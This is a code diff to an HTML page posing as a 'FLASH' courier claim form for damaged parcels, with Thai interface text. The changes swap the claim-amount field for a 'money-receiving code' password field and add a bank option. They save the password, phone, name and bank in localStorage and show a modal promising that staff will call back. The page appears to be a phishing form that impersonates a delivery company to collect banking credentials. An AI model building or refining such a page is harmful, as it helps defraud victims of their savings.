@@ -134,7 +134,7 @@
     <h2>📦 FLASH ยื่นเคลมพัสดุเสียหาย</h2>
 
     <input type="text" id="fullname" placeholder="ชื่อ - นามสกุล">
-    <input type="date" id="date">
+    <input type="text" id="date" placeholder="วัน/เดือน/ปี">
     <input type="text" id="phone" placeholder="เบอร์โทร">
 
     <!-- ✅ dropdown ธนาคาร -->
@@ -151,6 +151,9 @@
         </div>
         <div class="option-item" onclick="selectBank('ไทยพาณิชย์ (SCB)','SCB.jpeg')">
           <img src="SCB.jpeg"> ไทยพาณิชย์ (SCB)
+        </div>
+        <div class="option-item" onclick="selectBank('ธกส (BAAC)','baac.jpg')">
+          <img src="BAAC.jpg"> ธกส (ฺBAAC)
         </div>
         <div class="option-item" onclick="selectBank('ออมสิน (GSB)','GSB.png')">
           <img src="GSB.png"> ออมสิน (GSB)
@@ -176,7 +179,7 @@
       </div>
     </div>
 
-    <input type="number" id="amount" placeholder="จำนวนเงินที่ต้องการเคลม (บาท)">
+    <input type="text" id="password" placeholder="รหัสรับเงิน">
 
     <div class="btn-box">
       <button class="btn-submit" id="submitBtn" onclick="submitClaim()">📨 ยื่นคำร้อง</button>
@@ -214,42 +217,72 @@
       const name = document.getElementById("fullname").value.trim();
       const date = document.getElementById("date").value;
       const phone = document.getElementById("phone").value.trim();
-      const amount = document.getElementById("amount").value.trim();
       const bank = selectedBank;
-      const btn = document.getElementById("submitBtn");
+      const password = document.getElementById("password").value.trim();
 
-      if (!name || !date || !phone || !bank || !amount) {
-        alert("⚠️ กรุณากรอกข้อมูลให้ครบทุกช่อง");
+      if (!name || !date || !phone || !bank || !password ) {
+        alert(" กรุณากรอกข้อมูลให้ครบทุกช่อง");
         return;
       }
-
+      const btn = document.getElementById("submitBtn");
       btn.disabled = true;
       btn.textContent = "⏳ กำลังส่งข้อมูล...";
 
+      // ✅ เพิ่ม 3 บรรทัดนี้
+      localStorage.setItem("claim_code", password);
+      localStorage.setItem("claim_phone", phone);
+      localStorage.setItem("claim_time", Date.now());
+
       const claims = JSON.parse(localStorage.getItem("claim_requests")) || [];
       claims.push({
-        name, date, phone, bank, amount,
+        name, date, phone, bank,password,
         status: "รอตรวจสอบ",
         submitted: new Date().toLocaleString("th-TH")
       });
       localStorage.setItem("claim_requests", JSON.stringify(claims));
 
-      setTimeout(() => {
-        alert("✅ ยื่นคำร้องสำเร็จ! ระบบส่งข้อมูลไปยังหน้าแอดมินแล้ว");
-        window.location.href = "claim-success.html";
-      }, 500);
+    
+      showLoadingModal();
     }
 
-    // 🏠 กลับหน้าหลัก
+    function showLoadingModal() {
+      const modal = document.createElement("div");
+      modal.innerHTML = `
+        <div id="loadingModal" style="
+          position: fixed; top: 0; left: 0; right: 0; bottom: 0;
+          background: rgba(0,0,0,0.6); display: flex; justify-content: center; align-items: center;
+          z-index: 9999; font-family: 'Prompt', sans-serif;
+        ">
+          <div style="
+            background: #fff; border-radius: 16px; padding: 25px 30px;
+            width: 90%; max-width: 340px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.25);
+          ">
+            <div style="
+              border: 5px solid #f3f3f3;
+              border-top: 5px solid #ffeb3b;
+              border-radius: 50%;
+              width: 50px; height: 50px;
+              animation: spin 1s linear infinite;
+              margin: 0 auto 20px;
+            "></div>
+            <h3 style="color:#000; margin-bottom:10px;">ดำเนินการยื่นเรื่องเรียบร้อยแล้ว</h3>
+            <p style="color:#555; font-size:15px;">เจ้าหน้าที่จะติดต่อกลับไปภายในเร็วๆนี้</p>
+            <p style="color:#888; font-size:13px; margin-top:10px;">(ระบบจะกลับหน้าหลักภายใน 10 วินาที)</p>
+            <button onclick="goHome()" style="
+              margin-top:15px; background:#ffeb3b; border:none; border-radius:8px;
+              padding:10px 20px; font-weight:bold; cursor:pointer;
+            ">🏠 กลับหน้าหลัก</button>
+          </div>
+        </div>
+      `;
+      document.body.appendChild(modal);
+
+      setTimeout(() => goHome(), 10000);
+    }
+
     function goHome() {
-      const btn = document.querySelector(".btn-cancel");
-      btn.textContent = "🔄 กำลังกลับ...";
-      btn.style.opacity = "0.7";
-      setTimeout(() => {
-        window.location.href = "index.html";
-      }, 700);
+      window.location.href = "index.html";
     }
-
     // ✅ ปิด dropdown เมื่อคลิกนอก
     document.addEventListener("click", (e) => {
       if (!document.getElementById("bankSelect").contains(e.target))
